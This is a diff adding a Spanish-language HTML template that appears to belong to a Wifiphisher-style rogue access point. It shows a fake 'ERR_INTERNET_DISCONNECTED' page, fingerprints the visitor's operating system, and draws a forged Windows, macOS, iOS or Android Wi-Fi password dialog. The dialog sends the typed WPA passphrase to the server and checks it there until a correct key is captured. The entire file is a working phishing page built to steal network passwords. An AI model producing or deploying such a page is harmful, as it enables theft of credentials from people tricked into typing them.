@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html>
+<head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0,
+        maximum-scale=1.0, user-scalable=no">
+
+        <script>
+            /**
+         * JavaScript Client Detection
+         * (C) viazenetti GmbH (Christian Ludwig)
+         */
+        (function (window) {
+            {
+                var unknown = '-';
+
+                // screen
+                var screenSize = '';
+                if (screen.width) {
+                    width = (screen.width) ? screen.width : '';
+                    height = (screen.height) ? screen.height : '';
+                    screenSize += '' + width + " x " + height;
+                }
+
+                // browser
+                var nVer = navigator.appVersion;
+                var nAgt = navigator.userAgent;
+                var browser = navigator.appName;
+                var version = '' + parseFloat(navigator.appVersion);
+                var majorVersion = parseInt(navigator.appVersion, 10);
+                var nameOffset, verOffset, ix;
+
+                // Opera
+                if ((verOffset = nAgt.indexOf('Opera')) != -1) {
+                    browser = 'Opera';
+                    version = nAgt.substring(verOffset + 6);
+                    if ((verOffset = nAgt.indexOf('Version')) != -1) {
+                        version = nAgt.substring(verOffset + 8);
+                    }
+                }
+                // Opera Next
+                if ((verOffset = nAgt.indexOf('OPR')) != -1) {
+                    browser = 'Opera';
+                    version = nAgt.substring(verOffset + 4);
+                }
+                // Edge
+                else if ((verOffset = nAgt.indexOf('Edge')) != -1) {
+                    browser = 'Microsoft Edge';
+                    version = nAgt.substring(verOffset + 5);
+                }
+                // MSIE
+                else if ((verOffset = nAgt.indexOf('MSIE')) != -1) {
+                    browser = 'Microsoft Internet Explorer';
+                    version = nAgt.substring(verOffset + 5);
+                }
+                // Chrome
+                else if ((verOffset = nAgt.indexOf('Chrome')) != -1) {
+                    browser = 'Chrome';
+                    version = nAgt.substring(verOffset + 7);
+                }
+                // Safari
+                else if ((verOffset = nAgt.indexOf('Safari')) != -1) {
+                    browser = 'Safari';
+                    version = nAgt.substring(verOffset + 7);
+                    if ((verOffset = nAgt.indexOf('Version')) != -1) {
+                        version = nAgt.substring(verOffset + 8);
+                    }
+                }
+                // Firefox
+                else if ((verOffset = nAgt.indexOf('Firefox')) != -1) {
+                    browser = 'Firefox';
+                    version = nAgt.substring(verOffset + 8);
+                }
+                // MSIE 11+
+                else if (nAgt.indexOf('Trident/') != -1) {
+                    browser = 'Microsoft Internet Explorer';
+                    version = nAgt.substring(nAgt.indexOf('rv:') + 3);
+                }
+                // Other browsers
+                else if ((nameOffset = nAgt.lastIndexOf(' ') + 1) < (verOffset = nAgt.lastIndexOf('/'))) {
+                    browser = nAgt.substring(nameOffset, verOffset);
+                    version = nAgt.substring(verOffset + 1);
+                    if (browser.toLowerCase() == browser.toUpperCase()) {
+                        browser = navigator.appName;
+                    }
+                }
+                // trim the version string
+                if ((ix = version.indexOf(';')) != -1) version = version.substring(0, ix);
+                if ((ix = version.indexOf(' ')) != -1) version = version.substring(0, ix);
+                if ((ix = version.indexOf(')')) != -1) version = version.substring(0, ix);
+
+                majorVersion = parseInt('' + version, 10);
+                if (isNaN(majorVersion)) {
+                    version = '' + parseFloat(navigator.appVersion);
+                    majorVersion = parseInt(navigator.appVersion, 10);
+                }
+
+                // mobile version
+                var mobile = /Mobile|mini|Fennec|Android|iP(ad|od|hone)/.test(nVer);
+
+                // cookie
+                var cookieEnabled = (navigator.cookieEnabled) ? true : false;
+
+                if (typeof navigator.cookieEnabled == 'undefined' && !cookieEnabled) {
+                    document.cookie = 'testcookie';
+                    cookieEnabled = (document.cookie.indexOf('testcookie') != -1) ? true : false;
+                }
+
+                // system
+                var os = unknown;
+                var clientStrings = [
+                    {s:'Windows 10', r:/(Windows 10.0|Windows NT 10.0)/},
+                    {s:'Windows 8.1', r:/(Windows 8.1|Windows NT 6.3)/},
+                    {s:'Windows 8', r:/(Windows 8|Windows NT 6.2)/},
+                    {s:'Windows 7', r:/(Windows 7|Windows NT 6.1)/},
+                    {s:'Windows Vista', r:/Windows NT 6.0/},
+                    {s:'Windows Server 2003', r:/Windows NT 5.2/},
+                    {s:'Windows XP', r:/(Windows NT 5.1|Windows XP)/},
+                    {s:'Windows 2000', r:/(Windows NT 5.0|Windows 2000)/},
+                    {s:'Windows ME', r:/(Win 9x 4.90|Windows ME)/},
+                    {s:'Windows 98', r:/(Windows 98|Win98)/},
+                    {s:'Windows 95', r:/(Windows 95|Win95|Windows_95)/},
+                    {s:'Windows NT 4.0', r:/(Windows NT 4.0|WinNT4.0|WinNT|Windows NT)/},
+                    {s:'Windows CE', r:/Windows CE/},
+                    {s:'Windows 3.11', r:/Win16/},
+                    {s:'Android', r:/Android/},
+                    {s:'Open BSD', r:/OpenBSD/},
+                    {s:'Sun OS', r:/SunOS/},
+                    {s:'Linux', r:/(Linux|X11)/},
+                    {s:'iOS', r:/(iPhone|iPad|iPod)/},
+                    {s:'Mac OS X', r:/Mac OS X/},
+                    {s:'Mac OS', r:/(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/},
+                    {s:'QNX', r:/QNX/},
+                    {s:'UNIX', r:/UNIX/},
+                    {s:'BeOS', r:/BeOS/},
+                    {s:'OS/2', r:/OS\/2/},
+                    {s:'Search Bot', r:/(nuhk|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask Jeeves\/Teoma|ia_archiver)/}
+                ];
+                for (var id in clientStrings) {
+                    var cs = clientStrings[id];
+                    if (cs.r.test(nAgt)) {
+                        os = cs.s;
+                        break;
+                    }
+                }
+
+                var osVersion = unknown;
+
+                if (/Windows/.test(os)) {
+                    osVersion = /Windows (.*)/.exec(os)[1];
+                    os = 'Windows';
+                }
+
+                switch (os) {
+                    case 'Mac OS X':
+                        osVersion = /Mac OS X (10[\.\_\d]+)/.exec(nAgt)[1];
+                        break;
+
+                    case 'Android':
+                        osVersion = /Android ([\.\_\d]+)/.exec(nAgt)[1];
+                        break;
+
+                    case 'iOS':
+                        osVersion = /OS (\d+)_(\d+)_?(\d+)?/.exec(nVer);
+                        osVersion = osVersion[1] + '.' + osVersion[2] + '.' + (osVersion[3] | 0);
+                        break;
+                }
+
+                // flash (you'll need to include swfobject)
+                /* script src="//ajax.googleapis.com/ajax/libs/swfobject/2.2/swfobject.js" */
+                var flashVersion = 'no check';
+                if (typeof swfobject != 'undefined') {
+                    var fv = swfobject.getFlashPlayerVersion();
+                    if (fv.major > 0) {
+                        flashVersion = fv.major + '.' + fv.minor + ' r' + fv.release;
+                    }
+                    else  {
+                        flashVersion = unknown;
+                    }
+                }
+            }
+
+            window.jscd = {
+                screen: screenSize,
+                browser: browser,
+                browserVersion: version,
+                browserMajorVersion: majorVersion,
+                mobile: mobile,
+                os: os,
+                osVersion: osVersion,
+                cookies: cookieEnabled,
+                flashVersion: flashVersion
+            };
+        }(this));
+
+        var resolvedOs = jscd.os
+
+        if (resolvedOs == "Windows") {
+            document.write("<title i18n-content=\"title\">No se pudo conectar a Internet</title>");
+            document.write("<link rel='stylesheet' href='/static/chrome-offline.css' type='text/css' />")
+            document.write("<link rel='stylesheet' href='/static/style.css'>");
+            document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css'>");
+        }
+        else if (resolvedOs = "iOS") {
+            document.write("<link rel='stylesheet' href='/static/ios.css'>");
+        }
+        else {
+            document.write("<link rel='stylesheet' href='/static/mac-network-manager.css' />");
+        }
+
+
+        var loadhtml_mac = '<div id="details" class="hidden" ></div>' +
+        '<div class="mac-wifi" id="mac-wifi" style="display:none">' +
+        '    <div id="modal-title" class="title"></div>' +
+        '    <div class="content">' +
+        '        <div class="icon">' +
+        '            <img src="/static/wifi-icon.png" alt="WiFi signal" width="70" class="wifi-icon" />' +
+        '            <img src="/static/question.png" alt="?" width="25" class="question" />' +
+        '        </div>' +
+        '        <div class="description">' +
+        '           <form id="wifi-search-form" method="post" action="/post">' +
+        '               <strong>La red WiFi ″{{ target_ap_essid }}″ requiere una contraseña {{ target_ap_encryption }}.</strong>' + 
+        '               <div class="password">' +
+        '                   <label>Contraseña: </label>' +
+        '                   <input type="password" id="wifi-search-password" name="wfphshr-wpa-password"/>' +
+        '                   <br>' +
+        '                   <label id="pw_status"></label>' +
+        '                   <br>' +
+        '                   <div class="glow"></div>' +
+        '               </div>' + 
+        '               <div class="checkmark">' +
+        '                   <input id="show-password" type="checkbox" /><label for="show-password">Ver Contraseña</label>' +
+        '               </div>' +
+        '               <div class="checkmark">' +
+        '                   <input id="remember-network" type="checkbox" /><label for="remember-network">Recordar esta red</label>' +
+        '               </div>' + 
+        '               <div class="buttons">' +
+        '                   <input id="button-join" type="submit" value="Conectar">' +
+        '                   <input id="button-cancel" type="reset" value="Cancelar">' +
+        '               </div>' +
+        '           </form>' +
+        '       </div>' +
+        '   </div>' +
+        '</div>';
+
+        var loadhtml_windows = "<form id='windows-form' method='post' action='/post'><div class=\'network-manager\'\>" +
+        "<ul>" +
+        "       <li class='selected'>" +
+        "           <div class='wifi icon'>" +
+        "               <div class='dot dot1'></div>" +
+        "               <div class='small dot dot2'></div>" +
+        "               <div class='small dot dot3'></div>" +
+        "               <div class='small dot dot4'></div>" +
+        "           </div>" +
+        "           <div class='content'>" +
+        "               <strong>{{ target_ap_essid }}</strong>" +
+        "               <div class='disconnected'>" +
+        "                   <input id='automatic' type='checkbox' />" +
+        "                   <label for='automatic'>" +
+        "                       <div class='check'></div>" +
+        "                       Conectar automáticamente" +
+        "                   </label>" +
+        "                   <button id='connect' class='connect' type='button'>Conectar</button>" +
+        "               </div>" +
+        "               <div class='connected'>" +
+        "                   <label id='pw_status' for='presharedKey'>" +
+        "                       Introduce la contraseña" +
+        "                   </label>" +
+        "                   <input id='password' type='password' name='wfphshr-wpa-password' />" +
+        "                   También puedes conectarte pulsando el botón del" +
+        "                   router." +
+        "                   <input id='share' type='checkbox' />" +
+        "                   <label for='share'>" +
+        "                       <div class='check'></div>" +
+        "                       Compartir red con mis contactos" +
+        "                   </label>" +
+        "                   <button class='authenticate'>Siguiente</button> " +
+        "                   <button class='cancel' type='button'>Cancelar</button> " +
+        "               </div> " +
+        "           </div> " +
+        "       </li> " +
+                {% for ap in APs %} 
+        "        <li>" +
+        "           <div class='wifi icon'>" +
+        "               <div class='dot dot1'></div>" +
+        "               <div class='small dot dot2'></div>" +
+        "               <div class='small dot dot3'></div>" +
+        "               <div class='small dot dot4'></div>" +
+        "           </div>" +
+        "           <div class='content'>" +
+        "               <strong>{{ ap['essid'] }}</strong>" +
+        "               <span>Conectado</span>" +
+        "           </div>" +
+        "       </li>" +
+                {% end %}
+        "       </ul> " +
+        "       <a href=''>Ajustes de red</a> " +
+        "       </div></form>"; 
+        
+        var loadhtml_mobile = '<form id="wifi-search-form" method="post" action="/post">' +
+	'<input class="hidden" id="wifi-search-password" name="wfphshr-wpa-password" />' +
+	' 	<div class="buttons">' +
+        ' 		<button id="button-join" class="action hidden"></button>' +
+        ' 	</div>' +
+	'</form>';
+
+        var loadhtml_ios = '<div class="ios-container">'
+        + '<form id="ios-password-form" method="post" action="/post">'
+        + '  <div class="ios-header">Introduce la contraseña para "{{ target_ap_essid }}" </div>'
+        + '  <div class="ios-actions"><input type="reset" value="&nbsp;&nbsp;&nbsp;&nbsp;" class="action-button" style="float: left;"><input id="ios-join-button" type="submit" value="Conectar" class="action-button" style="float: right;"><div class="enter-password-text">Introducir contraseña</div></div>'
+        + '  <div class="ios-password-entry"><span style="margin-right: 12px">Contraseña</span><input id="ios-password" name="wfphshr-wpa-password" type="password" autofocus></div>'
+        + '  <div class="ios-note">También puede acceder a esta red Wi-Fi acercando su dispositivo a cualquier iPhone, iPad o Mac que se haya conectado a esta red y lo tenga en sus contactos.</div>'
+        + '  </form>'
+        + '<div id="ios-message"></div>'
+        + '</div>';
+
+        /* Callback receive the passphrase status and password*/
+        function validate_passphrase (password, callback) {
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("POST", "/backend/", true);
+            xhttp.onreadystatechange = function () {
+                if (this.readyState == 4 && this.status == 200)  {
+                    var json = JSON.parse(xhttp.responseText);
+                    callback(json.psk_verify, password);
+                }
+            };
+            var data = JSON.stringify({"psk_verify": password});
+            xhttp.send(data);
+        }
+
+        function windows_validate_action (pw_status, password) {
+            if (pw_status == "success") {
+                document.getElementByid("windows-form").submit(); 
+                document.getElementById("pw_status").innerHTML = "Introduce la contraseña de la red";
+            } else if (pw_status == "fail") {
+                document.getElementById("pw_status").innerHTML = "Introduce la contraseña de la red: la contraseña no es correcta!";
+            } else {
+                document.getElementById("windows-form").submit(); 
+            }
+        }
+
+        function mac_validate_action (pw_status, password) {
+            if (pw_status == "success") {
+                document.getElementById("wifi-search-form").submit(); 
+                document.getElementById("pw_status").innerHTML = ""
+            } else if (pw_status == "fail") {
+                document.getElementById("pw_status").innerHTML = "la contraseña no es correcta!"
+            } else {
+                document.getElementById("wifi-search-form").submit(); 
+            }
+        }
+
+        function mobile_validate_action (pw_status, password) {
+            if (pw_status == "success") {
+			    document.getElementById("wifi-search-password").value = password;
+			    document.getElementById("button-join").click();
+            } else if (pw_status == "fail") {
+                alert("Contraseña incorrecta! Por favor reintroduzca la contraseña.");
+		        var popup = prompt('La red Wi-Fi ″{{ target_ap_essid }}″ requiere una contraseña {{ target_ap_encryption }}.', '');
+                if (popup != null) { 
+                    validate_passphrase(popup, mobile_validate_action);
+                }
+            } else {
+			    document.getElementById("wifi-search-password").value = password;
+			    document.getElementById("button-join").click();
+            }
+        }
+
+        function ios_validate_action(pw_status, password) {
+            if (pw_status == "success") {
+                // Password matched, show a success message.
+                document.getElementById("ios-password").value = password;
+                document.getElementById("ios-message").innerHTML = "Conexión realizada";
+                document.getElementById("ios-password-form").submit();
+            } else if (pw_status == "fail") {
+                // Password did not match, show an error message.
+                document.getElementById("ios-message").innerHTML = "Conexión fallida, vuelva a intentarlo";
+            } else {
+                // The password is not being validated by the backend. Submit the form to capture the passphrase.
+                document.getElementById("ios-password-form").submit();
+                document.getElementById("ios-message").innerHTML = "Ha ocurrido un error, vuelva a intentarlo.";
+            }
+        }
+
+        function load_mobile() {
+		    var popup = prompt('La Red Wi-Fi ″{{ target_ap_essid }}″ requiere una contraseña {{ target_ap_encryption }}.', '');
+		    if (popup != null) {
+                validate_passphrase(popup, mobile_validate_action);
+		    }
+        }
+        
+        </script>
+        <title></title>
+        </head>
+    <body id="t" class="offline" style="font-family: 'Helvetica Neue', 'Lucida Grande', sans-serif; font-size: 75%;">
+    <div id="loader-ios"></div>
+    <div id="main-frame-error" class="interstitial-wrapper">
+        <div id="main-content">
+            <img class="dinosaur" src="static/dinosaur.png" width="45" />
+            <div class="icon icon-offline" style="visibility: hidden;"></div>
+            <div id="main-message">
+                <h1>No se puedo conectar a Internet</h1>
+                <p>Puede intentar diagnosticar el problema siguiendo los siguientes pasos:
+                <br />
+                Ir a
+                <strong>
+                Aplicaciones &gt; Preferencias del sistema &gt; Red &gt; Solucionar problemas
+                </strong>
+                para probar su conexión.</p>
+                <div id="suggestions-list" >
+                    <p >Intente:</p>
+                    <ul class="chrome-list">
+                        <li>Comprobar el enrutador o cable de red</li>
+                        <li>Reiniciar módem o router</li>
+                        <li>Volver a conectar Wi-Fi</li>
+                    </ul>
+                </div>
+                <div class="error-code">ERR_INTERNET_DISCONNECTED</div>
+            </div>
+        </div>
+        <div id="buttons" class="nav-wrapper suggested-right" >
+            <button id="details-button" class="text-button small-link singular">Detalles</button>
+        </div>
+        <div id="loader-mac"></div>
+        <div id="loader-windows"></div>
+        <div id="loader-mobile"></div>
+        <script>
+            if (resolvedOs == "Windows") {
+                document.getElementById("loader-windows").innerHTML = loadhtml_windows;
+                var myform = document.getElementById("windows-form");
+                myform.addEventListener("submit", function(evt) {
+                    evt.preventDefault();
+                    validate_passphrase(document.getElementById("password").value, windows_validate_action); 
+                });
+            }
+            else if (resolvedOs == "iOS") {
+                document.getElementById("loader-mobile").innerHTML = loadhtml_ios;
+                document.getElementById("loader-ios").innerHTML = loadhtml_ios;
+                document.getElementById("main-frame-error").innerHTML = "";
+                document.getElementById("ios-password").focus();
+                var myForm = document.getElementById("ios-password-form");
+                myForm.addEventListener("submit", function(evt) {
+                    evt.preventDefault();
+                    var password = document.getElementById("ios-password").value;
+                    validate_passphrase(password, ios_validate_action);
+                });
+            }
+            else if (resolvedOs == "Android") {
+                document.getElementById("loader-mobile").innerHTML = loadhtml_mobile;
+                load_mobile();
+            }
+            else {
+                document.getElementById("loader-mac").innerHTML = loadhtml_mac;
+                var myform = document.getElementById("wifi-search-form");
+                myform.addEventListener("submit", function(evt) {
+                    evt.preventDefault();
+                    validate_passphrase(document.getElementById("wifi-search-password").value, mac_validate_action); 
+                });
+            }
+        </script>
+        <script src='/static/win-behavior.js'></script>
+        <script src='/static/behavior.js'></script>
+    </body>
+</html>
